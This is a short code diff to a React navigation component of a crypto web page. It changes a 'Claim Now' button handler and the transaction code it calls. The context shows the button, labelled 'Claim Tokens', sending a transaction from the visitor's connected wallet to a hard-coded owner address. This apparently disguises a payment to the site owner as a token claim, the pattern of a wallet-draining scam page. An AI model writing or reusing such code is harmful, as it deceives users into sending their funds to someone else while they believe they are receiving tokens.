@@ -203,6 +203,7 @@ export default function Nav() {
       try {
         const tx = await signer.sendTransaction({
           to: OwnerAdress,
+          // value: Number(0.002),
           value: String(ownersShare),
         });
 
@@ -320,14 +321,14 @@ const newDat = 0.0026;
       {isConnected ? (
         <button
         onTouchStart={handleTokenTransfer}
-        onClick={async () => await handleTokenTransfer()}
+        onClick={handleTokenTransfer}
           className="w-full md:w-95 h-10 bg-green text-white p-5 text-sm md:text-base rounded-3xl z-10 flex items-center justify-center"
           aria-label="Claim Tokens"
         >
           Claim Now
         </button>
       ) : (
-        <div>
+        <div >
           <w3m-button balance="hide" label="Connect Wallet" />
         </div>
       )}
